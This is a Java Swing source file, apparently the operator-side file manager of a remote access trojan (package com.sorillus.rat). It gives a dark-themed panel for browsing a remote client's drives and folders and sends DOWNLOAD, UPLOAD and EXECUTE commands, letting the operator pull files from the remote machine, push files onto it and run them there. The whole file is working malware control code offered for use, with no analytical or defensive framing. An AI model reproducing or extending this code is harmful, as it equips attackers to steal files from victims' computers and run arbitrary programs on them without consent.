package com.sorillus.rat;

import com.formdev.flatlaf.FlatDarkLaf;
import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;
import java.awt.*;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class FileManager {
    private final JFrame frame;
    private final JTable fileTable;
    private final DefaultTableModel tableModel;
    private final JTree directoryTree;
    private final DefaultTreeModel treeModel;
    private final Server.ClientHandler clientHandler;
    private boolean waitingForResponse = false;
    private String currentPath;
    private final Map<String, DefaultMutableTreeNode> pathToNodeMap = new HashMap<>();

    public FileManager(Server.ClientHandler clientHandler) {
        try {
            UIManager.setLookAndFeel(new FlatDarkLaf());
        } catch (Exception e) {
            System.err.println("Failed to set FlatLaf: " + e.getMessage());
        }

        this.clientHandler = clientHandler;
        clientHandler.setFileManager(this);

        frame = new JFrame("File Manager - " + clientHandler.getClientId() + " (" + clientHandler.getIpAddress() + ")");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.setSize(1000, 600);
        frame.setLayout(new BorderLayout());

        JPanel topPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        JButton upButton = new JButton("Up");
        upButton.addActionListener(e -> goUp());
        JButton refreshButton = new JButton("Refresh");
        refreshButton.addActionListener(e -> refreshFileList());
        topPanel.add(upButton);
        topPanel.add(refreshButton);
        frame.add(topPanel, BorderLayout.NORTH);

        DefaultMutableTreeNode rootNode = new DefaultMutableTreeNode("This PC");
        treeModel = new DefaultTreeModel(rootNode);
        directoryTree = new JTree(treeModel);
        directoryTree.addTreeSelectionListener(e -> {
            DefaultMutableTreeNode selectedNode = (DefaultMutableTreeNode) directoryTree.getLastSelectedPathComponent();
            if (selectedNode != null) {
                String path = buildPath(selectedNode);
                if (!path.equals("This PC")) {
                    currentPath = path;
                    refreshFileList();
                }
            }
        });
        JScrollPane treeScrollPane = new JScrollPane(directoryTree);
        treeScrollPane.setPreferredSize(new Dimension(250, 0));
        frame.add(treeScrollPane, BorderLayout.WEST);

        String[] columnNames = {"Name", "Type", "Size (bytes)"};
        tableModel = new DefaultTableModel(columnNames, 0);
        fileTable = new JTable(tableModel);
        fileTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        fileTable.setRowHeight(25);
        fileTable.setFont(new Font("Segoe UI", Font.PLAIN, 14));

        JPopupMenu popupMenu = new JPopupMenu();
        JMenuItem downloadItem = new JMenuItem("Download");
        JMenuItem uploadItem = new JMenuItem("Upload");
        JMenuItem executeItem = new JMenuItem("Execute");

        downloadItem.addActionListener(e -> {
            int selectedRow = fileTable.getSelectedRow();
            if (selectedRow != -1) {
                String fileName = (String) tableModel.getValueAt(selectedRow, 0);
                String type = (String) tableModel.getValueAt(selectedRow, 1);
                if (type.equals("FILE")) {
                    String filePath = currentPath + "\\" + fileName;
                    clientHandler.sendCommand("DOWNLOAD:" + filePath);
                } else {
                    JOptionPane.showMessageDialog(frame, "Cannot download a directory!", "Error", JOptionPane.ERROR_MESSAGE);
                }
            }
        });

        uploadItem.addActionListener(e -> {
            JFileChooser fileChooser = new JFileChooser();
            if (fileChooser.showOpenDialog(frame) == JFileChooser.APPROVE_OPTION) {
                File file = fileChooser.getSelectedFile();
                String filePath = currentPath + "\\" + file.getName();
                clientHandler.sendCommand("UPLOAD:" + filePath + ":" + file.length());
                try {
                    FileInputStream fis = new FileInputStream(file);
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    OutputStream outputStream = clientHandler.getCommandOutputStream();
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        outputStream.write(buffer, 0, bytesRead);
                    }
                    fis.close();
                    outputStream.flush();
                } catch (IOException ex) {
                    JOptionPane.showMessageDialog(frame, "Error uploading file: " + ex.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
                }
            }
        });

        executeItem.addActionListener(e -> {
            int selectedRow = fileTable.getSelectedRow();
            if (selectedRow != -1) {
                String fileName = (String) tableModel.getValueAt(selectedRow, 0);
                String type = (String) tableModel.getValueAt(selectedRow, 1);
                if (type.equals("FILE")) {
                    String filePath = currentPath + "\\" + fileName;
                    clientHandler.sendCommand("EXECUTE:" + filePath);
                } else {
                    JOptionPane.showMessageDialog(frame, "Cannot execute a directory!", "Error", JOptionPane.ERROR_MESSAGE);
                }
            }
        });

        popupMenu.add(downloadItem);
        popupMenu.add(uploadItem);
        popupMenu.add(executeItem);
        fileTable.setComponentPopupMenu(popupMenu);

        fileTable.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                if (evt.getClickCount() == 2) {
                    int selectedRow = fileTable.getSelectedRow();
                    if (selectedRow != -1) {
                        String fileName = (String) tableModel.getValueAt(selectedRow, 0);
                        String type = (String) tableModel.getValueAt(selectedRow, 1);
                        if (type.equals("DIR")) {
                            currentPath = currentPath + "\\" + fileName;
                            refreshFileList();
                            updateTree();
                        }
                    }
                }
            }
        });

        frame.add(new JScrollPane(fileTable), BorderLayout.CENTER);

        frame.setLocationRelativeTo(null);
        frame.setVisible(true);

        initializeDrives();
    }

    private void initializeDrives() {
        clientHandler.sendCommand("LIST_DRIVES");
        waitingForResponse = true;
    }

    private void goUp() {
        File currentDir = new File(currentPath);
        File parentDir = currentDir.getParentFile();
        if (parentDir != null) {
            currentPath = parentDir.getAbsolutePath();
            refreshFileList();
            updateTree();
        }
    }

    private void refreshFileList() {
        if (currentPath != null) {
            clientHandler.sendCommand("LIST_FILES:" + currentPath);
            waitingForResponse = true;
        }
    }

    private String buildPath(DefaultMutableTreeNode node) {
        if (node == null || node.getUserObject().equals("This PC")) {
            return "This PC";
        }
        StringBuilder path = new StringBuilder();
        Object[] pathComponents = node.getUserObjectPath();
        for (int i = 1; i < pathComponents.length; i++) {
            path.append(pathComponents[i]);
            if (i < pathComponents.length - 1) {
                path.append("\\");
            }
        }
        return path.toString();
    }

    private void updateTree() {
        if (currentPath == null) return;

        String[] pathParts = currentPath.split("\\\\");
        DefaultMutableTreeNode currentNode = (DefaultMutableTreeNode) treeModel.getRoot();
        StringBuilder currentPathBuilder = new StringBuilder();

        if (pathParts.length > 0) {
            currentPathBuilder.append(pathParts[0]);
            String drive = currentPathBuilder.toString();
            DefaultMutableTreeNode driveNode = pathToNodeMap.get(drive);
            if (driveNode == null) {
                driveNode = new DefaultMutableTreeNode(drive);
                pathToNodeMap.put(drive, driveNode);
                currentNode.add(driveNode);
            }
            currentNode = driveNode;
        }

        for (int i = 1; i < pathParts.length; i++) {
            if (pathParts[i].isEmpty()) continue;
            currentPathBuilder.append("\\").append(pathParts[i]);
            DefaultMutableTreeNode childNode = pathToNodeMap.get(currentPathBuilder.toString());
            if (childNode == null) {
                childNode = new DefaultMutableTreeNode(pathParts[i]);
                pathToNodeMap.put(currentPathBuilder.toString(), childNode);
                currentNode.add(childNode);
                clientHandler.sendCommand("LIST_FILES:" + currentPathBuilder);
            }
            currentNode = childNode;
        }

        treeModel.reload();
        directoryTree.expandPath(new javax.swing.tree.TreePath(currentNode.getPath()));
        directoryTree.setSelectionPath(new javax.swing.tree.TreePath(currentNode.getPath()));
    }

    public boolean isWaitingForResponse() {
        return waitingForResponse;
    }

    public void handleResponse(String response) {
        waitingForResponse = false;
        if (response.startsWith("ERROR:")) {
            JOptionPane.showMessageDialog(frame, response.substring(6), "Error", JOptionPane.ERROR_MESSAGE);
        } else if (response.startsWith("DRIVE_LIST:")) {
            DefaultMutableTreeNode rootNode = (DefaultMutableTreeNode) treeModel.getRoot();
            rootNode.removeAllChildren();
            pathToNodeMap.clear();

            String driveList = response.substring(11);
            if (!driveList.isEmpty()) {
                String[] drives = driveList.split(";");
                for (String drive : drives) {
                    if (!drive.isEmpty()) {
                        DefaultMutableTreeNode driveNode = new DefaultMutableTreeNode(drive);
                        rootNode.add(driveNode);
                        pathToNodeMap.put(drive, driveNode);
                    }
                }
            }
            treeModel.reload();

            if (rootNode.getChildCount() > 0) {
                DefaultMutableTreeNode firstDrive = (DefaultMutableTreeNode) rootNode.getFirstChild();
                currentPath = firstDrive.getUserObject().toString();
                directoryTree.setSelectionPath(new javax.swing.tree.TreePath(firstDrive.getPath()));
                refreshFileList();
            }
        } else if (response.startsWith("FILE_LIST:")) {
            tableModel.setRowCount(0);
            String fileList = response.substring(10);
            if (!fileList.isEmpty()) {
                String[] files = fileList.split(";");
                for (String file : files) {
                    if (!file.isEmpty()) {
                        String[] parts = file.split("\\|");
                        tableModel.addRow(new Object[]{parts[0], parts[1], parts[2]});
                    }
                }
            }
        } else if (response.startsWith("UPLOAD_SUCCESS:")) {
            JOptionPane.showMessageDialog(frame, "File uploaded successfully: " + response.substring(14), "Success", JOptionPane.INFORMATION_MESSAGE);
            refreshFileList();
        } else if (response.startsWith("EXECUTE_SUCCESS:")) {
            JOptionPane.showMessageDialog(frame, "File executed successfully: " + response.substring(15), "Success", JOptionPane.INFORMATION_MESSAGE);
        }
    }
}